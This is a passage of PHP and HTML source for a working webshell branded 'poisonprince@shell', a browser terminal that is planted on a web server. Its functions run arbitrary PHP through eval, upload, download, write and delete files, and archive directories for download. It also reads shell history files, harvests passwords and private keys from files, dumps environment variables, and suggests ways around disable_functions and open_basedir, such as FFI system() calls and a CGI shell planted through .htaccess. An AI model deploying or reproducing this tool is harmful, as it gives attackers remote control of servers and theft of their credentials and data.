    array_push($tmp, "- Class <span style='color:red;'>FFI</span> exists with <span style='color:red;'>ffi.enable</span> set to 1.\n\tYou may try to execute the following PHP code:\n\n\t<span style='font-style:italic;color:blue;'>\$ffi = FFI::cdef(\"int system(const char *command);\");\n\t\$ffi->system(\"&lt;command&gt;\");</span>\n\n\tYou may want to redirect the command output to a writeable file, and read it afterwards.");
  }
  if(function_exists("apache_get_modules") && in_array('mod_cgi', apache_get_modules())){
    $codemsg = "could try to run the following PHP code:\n\n\t<span style='font-style:italic;color:blue;'>\$content = file_get_contents(\".htaccess\");\n\tfile_put_contents('.htaccess',\"Options +ExecCGI\\nAddHandler cgi-script .dizzle\\n\");\n\tfile_put_contents('shell.dizzle',\"#!/bin/bash\\necho -ne \\\"Content-Type: text/html\\\\n\\\\n\\\"\\n&lt;command&gt;\\n\\n\");chmod(\"shell.dizzle\",0777);\n\techo \"&lt;img src='shell.dizzle'&gt;\";</span>\n\tIf it doesn't work, try to find a writeable directory. Also, if Apache doesn't allow local overrides, it will not work.";
    if (is_writable('.htaccess')){
      array_push($tmp, "- Module <span style='color:purple;'>cgi</span> is enabled and it is possible to overwrite <b>.htaccess</b> (but maybe local .htaccess are ignored).\n\tYou  ".$codemsg);
    }
    else{
      array_push($tmp, "- Module <span style='color:purple;'>cgi</span> is enabled, but <b>.htaccess</b> does not exist or is not writeable. Anyway, you ".$codemsg);
    }
  }
  if (($no_check_versions || version_compare('2.68', php_uname("r")) < 1) && (
        (!strcmp("fpm-fcgi", php_sapi_name()) || !strcmp("cgi-fcgi", php_sapi_name())) && scandir("/lib") && scandir("/proc")
    )){
    array_push($tmp, "- If <span style='color:purple;'>/proc/self/mem</span> is readable, maybe this exploit could work: <a href='https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/php-tricks-esp/php-useful-functions-disable_functions-open_basedir-bypass/disable_functions-bypass-via-mem'>https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/php-tricks-esp/php-useful-functions-disable_functions-open_basedir-bypass/disable_functions-bypass-via-mem</a>");
  }

  $tmp1 = [];
  foreach([ "/etc/passwd", "/bin", "/usr/bin", "/usr/sbin", "/sbin", "/usr/local/bin", "/usr/local/sbin", "/lib", "/usr/lib", "/usr/local/lib" ] as $dangerous_rw){
    if (is_writeable($dangerous_rw)){
      array_push($tmp1, $dangerous_rw);
    }
  }
  if (count($tmp1)){
    array_push($tmp, "- Following files/directories are writeable: <span style='font-style:italic;color:blue;'>".implode("</span>, <span style='font-style:italic;color:blue;'>", $tmp1)."</span>.\n");
  }
  if (count($tmp)){
    $out .= "<span style='text-decoration: underline;'>Following weaknesses could be abused to bypass restrictions:</span>\n";
    $out .= implode("\n", $tmp);
  }
  return $out;
}

/**
 * Writes a file to the disk
 * $operands: the content the operator (either '>' or '>>') and the filename
 * return: Error or success message
 */
function doEcho(string $operands):string{
  $args = getArgs($operands);
  if (count($args) != 3){
    return "Bad syntax, need: echo <what> >|>> <outfile>";
  }
  $content = $args[0];
  $op = $args[1];
  $file = $args[2];
  $content = str_replace("\\n", "\n", $content);
  if (!strcmp($op, ">")){
    if (file_put_contents($file, $content) == false){
      return "Could not create or overwrite file $file";
    }
    return "File $file successfully written";
  }elseif(!strcmp($op, ">>")){
    if (file_put_contents($file, $content, FILE_APPEND) == false){
      return "Could not create or append data to file $file";
    }
    return "File $file successfully written";
  }
  else{
    return "Bad syntax, operator must be either '>' or '>>', without quotes";
  }
}

/**
* Gets environment variables
* return: The formatted env variables
**/
function doEnv():string{
  $env = getenv();
  $out = "";
  foreach ($env as $key => $value) {
    $out .= "$key=$value";
  }
  return $out;
}

/**
* Evaluates PHP code
* $code: The code evaluate
* return: The PHP output
**/
function doEval(string $code):string{
  set_error_handler(function($_errno, $errstr) {
    // Convert notice, warning, etc. to error.
    throw new Error($errstr);
});
  ob_start();
  try {
    eval($code);
    $data = ob_get_contents();
  }
  catch(Throwable $t){
    $data = "Error $t";
  }
  ob_end_clean();
  return $data;
}

/**
* Displays the manual
* return: The manual
**/
function doHelp():string{
  $out = "Optional arguments are marked with '?'\nPossible commands:\n";
  foreach (COMMANDS as $cmd => $value) {
    $out .= "- $cmd$value\n";
  }
  return $out;
}

/**
* Looks for *_history files in the HOME
* return: The history files + summary, or error
*
**/
function doGetHist():string{
  $path = getenv("HOME");
  if (!$path ){
    $path = getcwd();
    $warning = "HOME variable is not set, defaulting to current directory\n";
  }
  $files = glob("$path/.*history");
  foreach ($files as $filename) {
    $out .= "$filename\n";
    $content = file_get_contents($filename);
    if ($content){
      $out .= "$content\n\n";
    }
    else{
      $out .= "Cannot read $filename, skipping";
    }
  }
  if (isset($warning)){$out .= "$warning\n"; }
  if($files && count($files)){
    $out .= "Found ".count($files)." history file(s):\n".implode("\n", $files);
  }
  else{
    $out .= "Could not find history files in the directory $path";
  }
  return $out;
}

/**
* Looks for potential passwords in files
* $path: The directory to analyse
* return: The grep'ed results, colored
**/
function doGetPasswd(string $path):string{

  if (!strlen($path)){
    $path = getcwd();
  }

  $files = walk_dir($path);
  if (!$files){
    return "Access to directory $path is denied";
  }
  $results = [];
  $interesting_files = [];
  foreach ($files as $f) {
    $ext = strtolower(pathinfo($f, PATHINFO_EXTENSION));
    if (in_array($ext, EXTENSIONS)){
      $fcontent = file_get_contents($f);
      if ($fcontent){
        foreach (NEEDLE_PASSWDS as $needle) {
          $ok = preg_match_all("/^.*($needle\w*)\s*[:=>\"'].*\$/mi", $fcontent, $matches); //just check if line matches
          if ($ok){
            $shortpath = substr($f, strlen($path)+1);
            foreach ($matches[0] as $match) {
              $line = htmlspecialchars($match);
              array_push($results,
                "<span style='color:purple;'>$shortpath</span>: ".preg_replace("/($needle\w*)/mi", '<span style="color:red;">$1</span>', $line));
            }
          }
        }
      }
    }else{
      $pathinfo = pathinfo($f); 
      if(in_array($pathinfo["basename"], INTERESTING_FILES) ||
        (isset($pathinfo["extension"]) && in_array(strtolower($pathinfo["extension"]), INTERESTING_EXTENSIONS)) ||
        (!strcmp(substr(decoct(fileperms($f)),3), "600") && fileowner($f) == posix_geteuid() && ($content = file_get_contents($f)) && str_starts_with($content, "-----BEGIN "))){
        $shortpath = substr($f, strlen($path)+1);
        array_push($interesting_files, $shortpath);
      }
    }
  }
  $out = implode("\n", $results);
  if (count($interesting_files)){
    $out .= "\n\nYou may also want to take a look at these files:\n".implode("\n", $interesting_files);
  }
  return $out;
}

/**
* Looks for specific patterns in files
* $operands: Command line arguments
* return: Matching occurrences
**/

function doGrep(string $operands):string{
  $args = getArgs($operands);
  if (!count($args)){
    return "Invalid arguments $operands";
  }
  $pattern = $args[0];
  if (count($args) == 1){
    $path = getcwd();
    $ignorecase = false;
  }
  elseif (count($args) == 2) {
    if (!strcmp($args[1], "-i")){
      $ignorecase = true;
      $path = getcwd();
    }
    else {
      $path = $args[1];
      $ignorecase = false;
    }
  }
  elseif(count($args) == 3) {
    if (!strcmp($args[1], "-i")){
      $ignorecase = true;
      $path = $args[2];
    }
    elseif(!strcmp($args[2], "-i")){
      $path = $args[1];
      $ignorecase = true;
    }
    else{
      return "Bad arguments";
    }
  }
  else{
    return "Too much arguments";
  }
  if (!file_exists($path)){
    return "Path $path does not exist";
  }

  /* Inner function that greps files */
  function grep_file($pattern, $ignorecase, $path){
    $results = [];
    $f = file_get_contents($path);
    if (!$f){
      return [];
    }
    if ($ignorecase ){
      $ok = preg_match_all("/^.*$pattern.*$/mi", $f, $matches);
    }
    else{
      $ok = preg_match_all("/^.*$pattern.*$/m", $f, $matches);
    }
    if ($ok){
      if ($ignorecase){
        $replace = "/($pattern)/mi";
      }
      else{
        $replace = "/($pattern)/m";
      }
      foreach ($matches[0] as $match) {
        $line = htmlspecialchars($match);
        array_push($results, "<span style='color:purple;'>$path</span>: ".preg_replace($replace, '<span style="color:red;">$1</span>', $line));
      }
    }
    return $results;
  }
  if (is_dir($path)){
    $res = "";
    $files = walk_dir($path);
    foreach ($files as $file) {
      $matches = grep_file($pattern, $ignorecase, $file);
      if (count($matches)){
        $res .= implode("\n", $matches);
        $res .= "\n";
      }
    }
    return $res;
  }
  return implode("\n", grep_file($pattern, $ignorecase, $path));
}
/**
* Builds the result of the /usr/bin/id command
* return: The command output
**/
function doId():string{
  global $functions;
  $uinfo = $functions['posix_getpwuid'](posix_geteuid());
  $group = $functions['posix_getgrgid']($uinfo['gid'])['name'];
  $out_groups = "groups=";
  foreach (posix_getgroups() as $grid) {
    $grname = $functions['posix_getgrgid']($grid)['name'];
    $out_groups .= "$grid($grname),";
  }
  $out_groups = substr($out_groups, 0, -1);
  return "uid=${uinfo['uid']}(${uinfo['name']}) gid=${uinfo['gid']}($group) $out_groups";
}

/**
* Lists files
* $path: Can be:
*      <empty>
*      -R
*      <folder>
*      -R <folder>
* return: The output of the command
**/
function doLs(string $path): string {
  if (!strlen($path)){$path = getcwd();}
  $recursive = false;
  if (str_starts_with($path, "-R ")){
    $recursive = true;
    $path = trim(substr($path, 3));
  }
  elseif (!strcmp($path, "-R")) {
    $path = getcwd();
    $recursive = true;
  }
  if (file_exists($path)){
    if (is_dir($path)) {
      if (!str_ends_with($path, "/")){
        $path .= "/";
      }

      $finfos = [];
      if (!$recursive){
        $list_dir = scandir($path, SCANDIR_SORT_ASCENDING);
        foreach ($list_dir as $xfile) {
          array_push($finfos, get_finfo($path.$xfile));
        }
        return format_ls($finfos);
      }
      else{
        return walk_dir_2($path);
      }
    }
    else {
      return implode(" ", get_finfo($path, true));
    }
  }
  else {
    return "No such file or directory: $path";
  }
}

/**
* Creates a directory, recursively
* $path: Path to the new directory. Creates missing ones
* return: Success or error message
**/
function doMkdir(string $path): string {
  if (!strlen($path)) {return "Error, empty name"; }
  while (strpos($path, "//") !== false){
    $path = str_replace("//", "/", $path);
  }
  if (mkdir($path, 0777, true)){
    return "Success, directory $path created";
  }
  return "Error, access denied or directory already exists";
}

/**
* Renames a file/folder
* Uses complicated regex for these weird people who put blank spaces in their file names. Still, I'm not sure that it really works ):
* $operands: The source and target
* return: Success of error message
**/
function doMv(string $operands): string{
  //https://stackoverflow.com/questions/17848618/parsing-command-arguments-in-php
  $args = getArgs($operands);
  if (count($args) > 1) {
    $op1 = $args[0];
    $op2 = $args[1];
    if (file_exists($op1)){
      if (rename($op1, $op2)){
        return "File $op1 renamed";
      }
      return "Cannot rename file $op1";
    }
    return "File $op1 does not exist";
  }
  return "Error, could not handle paths *$operands*\n";
}

/**
* Executes phpinfo and puts the result in an iframe
* return: phpinfo result in html
**/
function doPHPInfo():string{
  ob_start();
  phpinfo();
  $data = ob_get_contents();
  ob_end_clean();
   return "<iframe style='width:100%;height:100%;' src='data:text/html;base64,".base64_encode($data)."'><iframe>";
}

function doPs(): string{
  global $functions;
  if (!file_exists("/proc")){
    return "Cannot read /proc content, sorry";
  }
  $procs = glob("/proc/*");
  $processes = ["UID", "PID", "PPID", "CMD"];
  
  foreach($procs as $proc){
    if(preg_match('/\/proc\/(\d+)/', $proc, $match)) {
      $pid = $match[1];
      $status = @file_get_contents($proc."/status");
      $cmdline = @file_get_contents($proc."/cmdline");
      if ($status){
        $uid = "?";
        preg_match("/^Uid:\s+(\d+)/m", $status, $match);
        $uid = $functions['posix_getpwuid'](intval($match[1]))["name"];
        preg_match("/^PPid:\s+(\d+)/m", $status, $match);
        $ppid = $match[1];
        if ($cmdline){
            array_push($processes, $uid, $pid, $ppid, str_replace("\0", " " , $cmdline));
        }
        else{
            preg_match("/^Name:\s+(.*)/m", $status, $match);
            if (count($match)){
                array_push($processes, $uid, $pid, $ppid, "[".$match[1]."]");
            }
            else{
                array_push($processes, $uid, $pid, $ppid, "<unknown>");
            }
        }
      }
    }
  }
  return format_array($processes, 4);;
}
/**
* Removes a file
* $path: Rhe file to be removed. I assume that it is everything that follows the 'rm ', don't care about quotes or stuff
* return: Success or error message
**/
function doRm(string $path):string{
  if (file_exists($path)){
    if (is_file($path)){
      if (unlink($path)){ return "File $path deleted";}
      return "Could not delete file $path";
    }
    else {
      if (rrmdir($path)){ return "Directory $path deleted.";}
      return "Could not delete directory $path";
    }
  }
  return "File $path does not exist";
}

/**
* Creates a tar archive for a given folder. Removes it once read
* $path: Path to the folder to tar
* return: The result of featureDownload
**/
function doTar(string $path):array{
  if(!strlen($path)){$path = getcwd();}
  elseif (!file_exists($path)){
    return featureDownload($path); //let is miserably fail, on purpose
  }
  $archname = generateRandomString().".tar";
  try{
    $phardata = new PharData($archname);
    $iterator = new RecursiveIteratorIterator(
        new RecursiveDirectoryIterator($path, RecursiveDirectoryIterator::SKIP_DOTS)
    );
    $phardata->buildFromIterator($iterator, $path);
    $phardata->compress(Phar::GZ);
    $result = featureDownload($archname.".gz");
    unlink($archname);
    unlink($archname.".gz");
    return $result;
  }
  catch (Exception $e){
    return array(
        'stdout' => "Error: $e",
        'cwd' => getcwd(),
        'raw' => false,
    );
  }
}

/**
* Main dispatcher
* $cmdline: The command
* $cwd: The current working directory. It is sent back and forth between client and server
* return: Array with the output, CWD, and a flag instructing the client side to either escape or display as HTML
**/
function featureShell(string $cmdline, string $cwd):array {
  $raw = false;
  $cmdline = trim($cmdline);
  $idx = strpos($cmdline, " ");
  if ($idx !== false){
    $command = substr($cmdline, 0, $idx);
  }
  else {
    $command = $cmdline;
  }
  chdir($cwd);
  if (!bypass_openbasedir($cwd)){
    $out = "Warning: open_basedir policy is enforced and could not be bypassed\n\n";
  }
  else{
    $out = "";
  }
  if (array_key_exists($command, COMMANDS)){
    switch($command){
      case "cat":
        $out .= doCat(trim(substr($cmdline, 4)));
        break;
      case "cd":
        $out .= doCd(trim(substr($cmdline, 3)));
        break;
      case "chkbypass":
        $out .= doChkbypass(trim(substr($cmdline, 10)));
        $raw = true;
        break;
      case "download":
        return featureDownload(trim(substr($cmdline, 9)));
      case "echo":
        $out .= doEcho(trim(substr($cmdline, 5)));
        break;
      case "env":
        $out .= doEnv();
        break;
      case "eval":
        $out .= doEval(trim(substr($cmdline, 5)));
        break;
      case "gethist":
        $out .= doGetHist();
        break;
      case "getpasswd":
        $out .= doGetPasswd(trim(substr($cmdline, 10)));
        $raw = true;
        break;
      case "grep":
        $out .= doGrep(trim(substr($cmdline, 5)));
        $raw = true;
        break;
      case "id":
        $out .= doId();
        break;
      case "ls":
        $out .= doLs(trim(substr($cmdline, 3)));
        break;
      case "mkdir":
        $out .= doMkdir(trim(substr($cmdline, 6)));
        break;
      case "mv":
        $out .= doMv(trim(substr($cmdline, 3)));
        break;
      case "phpinfo":
        $out .= doPHPInfo();
        $raw = true;
        break;
      case "ps":
        $out .= doPs();
        break;
      case "pwd":
        $out .= getcwd();
        break;
      case "rm":
        $out .= doRm(trim(substr($cmdline, 3)));
        break;
      case "tar":
        return doTar(trim(substr($cmdline, 4)));
        break;
      case "upload":
        $out .= "Error, missing file"; //should not be there, it means that no file was submitted
        break;
      case "help":
      case "?":
        $out .= doHelp();
        break;
    }
    return array(
        "stdout" => $out,
        "cwd" => getcwd(),
        "raw" => $raw
    );
  }
  else{
    return array(
        "stdout" => "No such command $command. Type 'help' or '?' to get help",
        "cwd" => getcwd(),
        "raw" => $raw
    );
  }
}

/**
* Autocompletion
* $filename: The beginning of the command or the operand
* $cwd: Current working directory
* $type: command or operand ?
* return: The list of matching commands or matching files/folders
**/
function featureHint(string $fileName, string $cwd, string $type):array {
  if ($type == 'cmd') {
      $res_cmds = [];
      foreach (COMMANDS as $cmd => $value) {
        if (str_starts_with($cmd, $fileName)){
          array_push($res_cmds, $cmd);
        }
      }
      return array(
          'files' => $res_cmds
      );
  }
  chdir($cwd);
  bypass_openbasedir($cwd);
  $match_scan_dir = [];
  $idx = strrpos($fileName, "/");
  if (!strlen($fileName)) {
    foreach (scandir(".", SCANDIR_SORT_ASCENDING) as $x){
      array_push($match_scan_dir, $x);
    }
  }
  else {
    if ($idx === false ){
      $path = "./";
      $fileName = "./$fileName";
    }
    else{
      $path = substr($fileName, 0, $idx+1);
    }
    $res_scandir = scandir($path, SCANDIR_SORT_ASCENDING);
    if ($res_scandir === false){
      return array('files' => []);
    }
    foreach ($res_scandir as $x){
      if (str_starts_with($path.$x, $fileName) && strcmp(".", $x) && strcmp("..", $x)){
        $filepath = $path.$x;
        if (is_dir($filepath)){$filepath .= "/"; }
        array_push($match_scan_dir, $filepath);
      }
    }
  }
  return array(
      'files' => $match_scan_dir
  );
}

/**
* Downloads a file
* $filepath: Self-explanatory, huh ?
* return: Array with:
*             the file content base64'ed + file path
*             error message, CWD, and flag raw
**/
function featureDownload(string $filePath):array {
  $file = @file_get_contents($filePath);
  if ($file === FALSE) {
      return array(
          'stdout' => 'File not found / no read permission.',
          'cwd' => getcwd(),
          'raw' => false,
      );
  } else {
      return array(
          'name' => basename($filePath),
          'file' => base64_encode($file)
      );
  }
}

/**
* Uploads a file
* $path: The target path
* file: base64'ed file
* $cwd: CWD
* return: Array with success or error message
**/
function featureUpload(string $path, string $file, string $cwd) {
    chdir($cwd);
    $f = @fopen($path, 'wb');
    if ($f === FALSE) {
        return array(
            'stdout' => 'Invalid path / no write permission.',
            'cwd' => getcwd(),
            'raw' => false,
        );
    } else {
        fwrite($f, base64_decode($file));
        fclose($f);
        return array(
            'stdout' => 'Done.',
            'cwd' => getcwd(),
            'raw' => false
        );
    }
}

if (isset($_GET["feature"])) {
    $response = NULL;
    switch ($_GET["feature"]) {
        case "shell":
            $cmd = $_POST['cmd'];
            $response = featureShell($cmd, $_POST["cwd"]);
            break;
        case "pwd":
            $response = array("cwd" => getcwd());
            break;
        case "hint":
            $response = featureHint($_POST['filename'], $_POST['cwd'], $_POST['type']);
            break;
        case 'upload':
            $response = featureUpload($_POST['path'], $_POST['file'], $_POST['cwd']);
    }

    header("Content-Type: application/json");
    echo json_encode($response);
    die();
}

?>
<!DOCTYPE html>
<html>
    <head>
        <meta charset="UTF-8" />
        <title>poisonprince@shell:~#</title>
        <meta name="viewport" content="width=device-width, initial-scale=1.0" />
        <style>
            html, body {
                margin: 0;
                padding: 0;
                background: #333;
                color: #eee;
                font-family: monospace;
            }

            *::-webkit-scrollbar-track {
                border-radius: 8px;
                background-color: #353535;
            }

            *::-webkit-scrollbar {
                width: 8px;
                height: 8px;
            }

            *::-webkit-scrollbar-thumb {
                border-radius: 8px;
                -webkit-box-shadow: inset 0 0 6px rgba(0,0,0,.3);
                background-color: #bcbcbc;
            }

            #shell {
                background: #222;
                margin: 50px 10px 0 10px;
                box-shadow: 0 0 5px rgba(0, 0, 0, .3);
                font-size: 10pt;
                display: flex;
                flex-direction: column;
                align-items: stretch;
            }

            #shell-content {
                height: 600px;
                overflow: auto;
                padding: 5px;
                white-space: pre-wrap;
                flex-grow: 1;
            }

            #shell-logo {
                font-weight: bold;
                color: #FF4180;
                text-align: center;
            }

            #shell-sub {
                font-weight: bold;
                text-align: center;
            }

            @media (max-width: 991px) {
                #shell-logo {
                    font-size: 6px;
                    margin: -25px 0;
                }

                html, body, #shell {
                    height: 100%;
                    width: 100%;
                    max-width: none;
                }

                #shell {
                    margin-top: 0;
                }
            }

            @media (max-width: 767px) {
                #shell-input {
                    flex-direction: column;
                }
            }

            @media (max-width: 320px) {
                #shell-logo {
                    font-size: 5px;
                }
            }

            .shell-prompt {
                font-weight: bold;
                color: #75DF0B;
            }

            .shell-prompt > span {
                color: #1BC9E7;
            }

            #shell-input {
                display: flex;
                box-shadow: 0 -1px 0 rgba(0, 0, 0, .3);
                border-top: rgba(255, 255, 255, .05) solid 1px;
            }

            #shell-input > label {
                flex-grow: 0;
                display: block;
                padding: 0 5px;
                height: 30px;
                line-height: 30px;
            }

            #shell-input #shell-cmd {
                height: 30px;
                line-height: 30px;
                border: none;
                background: transparent;
                color: #eee;
                font-family: monospace;
                font-size: 10pt;
                width: 100%;
                align-self: center;
            }

            #shell-input div {
                flex-grow: 1;
                align-items: stretch;
            }

            #shell-input input {
                outline: none;
            }
        </style>

        <script>
            var CWD = null;
            var commandHistory = [];
            var historyPosition = 0;
            var eShellCmdInput = null;
            var eShellContent = null;

            function _insertCommand(command) {
                eShellContent.innerHTML += "\n\n";
                eShellContent.innerHTML += '<span class=\"shell-prompt\">' + genPrompt(CWD) + '</span> ';
                eShellContent.innerHTML += escapeHtml(command);
                eShellContent.innerHTML += "\n";
                eShellContent.scrollTop = eShellContent.scrollHeight;
            }

            function _insertStdout(stdout, raw) {
                if (raw) {
                  eShellContent.innerHTML += stdout;
                }
                else {
                  eShellContent.innerHTML += escapeHtml(stdout);
                }
                eShellContent.scrollTop = eShellContent.scrollHeight;
            }

            function _defer(callback) {
                setTimeout(callback, 0);
            }

            function featureShell(command) {

                _insertCommand(command);
                if (/^\s*upload\s+[^\s]+\s*$/.test(command)) {
                    featureUpload(command.match(/^\s*upload\s+([^\s]+)\s*$/)[1]);
                } else if (/^\s*clear\s*$/.test(command)) {
                    // Backend shell TERM environment variable not set. Clear command history from UI but keep in buffer
                    eShellContent.innerHTML = '';
                } else {
                    makeRequest("?feature=shell", {cmd: command, cwd: CWD}, function (response) {
                        if (response.hasOwnProperty('file')) {
                            featureDownload(response.name, response.file)
                        } else {
                            _insertStdout(response.stdout, response.raw);
                            updateCwd(response.cwd);
                        }
                    });
                }
            }

            function featureHint() {
                if (eShellCmdInput.value.trim().length === 0) return;  // field is empty -> nothing to complete

                function _requestCallback(data) {
                    if (!data.files.length) return;  // no completion
                    if (data.files.length === 1) {
                        if (type === 'cmd') {
                            eShellCmdInput.value = data.files[0];
                        } else {
                            var currentValue = eShellCmdInput.value;
                            eShellCmdInput.value = currentValue.replace(/([^\s]*)$/, data.files[0]);
                        }
                    } else {
                        _insertCommand(eShellCmdInput.value);
                        _insertStdout(data.files.join("\n"), false);
                    }
                }

                var currentCmd = eShellCmdInput.value.split(" ");
                var type = (currentCmd.length === 1) ? "cmd" : "file";
                var fileName = (type === "cmd") ? currentCmd[0] : currentCmd[currentCmd.length - 1];

                makeRequest(
                    "?feature=hint",
                    {
                        filename: fileName,
                        cwd: CWD,
                        type: type
                    },
                    _requestCallback
                );

            }

            function featureDownload(name, file) {
                var element = document.createElement('a');
                element.setAttribute('href', 'data:application/octet-stream;base64,' + file);
                element.setAttribute('download', name);
                element.style.display = 'none';
                document.body.appendChild(element);
                element.click();
                document.body.removeChild(element);
                _insertStdout('Done.', false);
            }

            function featureUpload(path) {
                var element = document.createElement('input');
                element.setAttribute('type', 'file');
                element.style.display = 'none';
                document.body.appendChild(element);
                element.addEventListener('change', function () {
                    var promise = getBase64(element.files[0]);
                    promise.then(function (file) {
                        makeRequest('?feature=upload', {path: path, file: file, cwd: CWD}, function (response) {
                            _insertStdout(response.stdout, response.raw);
                            updateCwd(response.cwd);
                        });
                    }, function () {
                        _insertStdout('An unknown client-side error occurred.', false);
                    });
                });
                element.click();
                document.body.removeChild(element);
            }

            function getBase64(file, onLoadCallback) {
                return new Promise(function(resolve, reject) {
                    var reader = new FileReader();
                    reader.onload = function() { resolve(reader.result.match(/base64,(.*)$/)[1]); };
                    reader.onerror = reject;
                    reader.readAsDataURL(file);
                });
            }

            function genPrompt(cwd) {
                cwd = cwd || "~";
                var shortCwd = cwd;
                if (cwd.split("/").length > 3) {
                    var splittedCwd = cwd.split("/");
                    shortCwd = "…/" + splittedCwd[splittedCwd.length-2] + "/" + splittedCwd[splittedCwd.length-1];
                }
                return "poisonprince@shell:<span title=\"" + cwd + "\">" + shortCwd + "</span>#";
            }

            function updateCwd(cwd) {
                if (cwd) {
                    CWD = cwd;
                    _updatePrompt();
                    return;
                }
                makeRequest("?feature=pwd", {}, function(response) {
                    CWD = response.cwd;
                    _updatePrompt();
                });

            }

            function escapeHtml(string) {
                return string
                    .replace(/&/g, "&amp;")
                    .replace(/</g, "&lt;")
                    .replace(/>/g, "&gt;");
            }

            function _updatePrompt() {
                var eShellPrompt = document.getElementById("shell-prompt");
                eShellPrompt.innerHTML = genPrompt(CWD);
            }

            function _onShellCmdKeyDown(event) {
                switch (event.key) {
                    case "Enter":
                        featureShell(eShellCmdInput.value);
                        insertToHistory(eShellCmdInput.value);
                        eShellCmdInput.value = "";
                        break;
                    case "ArrowUp":
                        if (historyPosition > 0) {
                            historyPosition--;
                            eShellCmdInput.blur();
                            eShellCmdInput.value = commandHistory[historyPosition];
                            _defer(function() {
                                eShellCmdInput.focus();
                            });
                        }
                        break;
                    case "ArrowDown":
                        if (historyPosition >= commandHistory.length) {
                            break;
                        }
                        historyPosition++;
                        if (historyPosition === commandHistory.length) {
                            eShellCmdInput.value = "";
                        } else {
                            eShellCmdInput.blur();
                            eShellCmdInput.focus();
                            eShellCmdInput.value = commandHistory[historyPosition];
                        }
                        break;
                    case 'Tab':
                        event.preventDefault();
                        featureHint();
                        break;
                }
            }

            function insertToHistory(cmd) {
                commandHistory.push(cmd);
                historyPosition = commandHistory.length;
            }

            function makeRequest(url, params, callback) {
                function getQueryString() {
                    var a = [];
                    for (var key in params) {
                        if (params.hasOwnProperty(key)) {
                            a.push(encodeURIComponent(key) + "=" + encodeURIComponent(params[key]));
                        }
                    }
                    return a.join("&");
                }
                var xhr = new XMLHttpRequest();
                xhr.open("POST", url, true);
                xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
                xhr.onreadystatechange = function() {
                    if (xhr.readyState === 4 && xhr.status === 200) {
                        try {
                            var responseJson = JSON.parse(xhr.responseText);
                            callback(responseJson);
                        } catch (error) {
                            alert("Error while parsing response: " + error);
                        }
                    }
                };
                xhr.send(getQueryString());
            }

            document.onclick = function(event) {
                event = event || window.event;
                var selection = window.getSelection();
                var target = event.target || event.srcElement;

                if (target.tagName === "SELECT") {
                    return;
                }

                if (!selection.toString()) {
                    eShellCmdInput.focus();
                }
            };

            window.onload = function() {
                eShellCmdInput = document.getElementById("shell-cmd");
                eShellContent = document.getElementById("shell-content");
                updateCwd();
                eShellCmdInput.focus();
            };
        </script>
    </head>

    <body>
        <div id="shell">
            <pre id="shell-content">
                <div id="shell-logo">                                            
              _                            _                            _          _ _         _  _   <span></span>
             (_)                          (_)                 ____     | |        | | |_     _| || |_ <span></span>
  _ __   ___  _ ___  ___  _ __  _ __  _ __ _ _ __   ___ ___  / __ \ ___| |__   ___| | (_)   |_ __   _|<span></span>
 | '_ \ / _ \| / __|/ _ \| '_ \| '_ \| '__| | '_ \ / __/ _ \/ / _` / __| '_ \ / _ \ | |  /\/ _| || |_ <span></span>
 | |_) | (_) | \__ \ (_) | | | | |_) | |  | | | | | (_|  __/ | (_| \__ \ | | |  __/ | (_)/\/|_  __  _|<span></span>
 | .__/ \___/|_|___/\___/|_| |_| .__/|_|  |_|_| |_|\___\___|\ \__,_|___/_| |_|\___|_|_|       |_||_|  <span></span>
 | |                           | |                           \____/                                   <span></span>
 |_|                           |_|                                                                    <span></span>
                </div>
                <div id="shell-sub">
A restricted PHP webshell based on poisonprince@shell - Testeur de stylos<span></span>
                </div>
            </pre>
            <div id="shell-input">
                <label for="shell-cmd" id="shell-prompt" class="shell-prompt">???</label>
                <div>
                    <input id="shell-cmd" name="cmd" onkeydown="_onShellCmdKeyDown(event)"/>
                </div>
            </div>
        </div>
    </body>

</html>
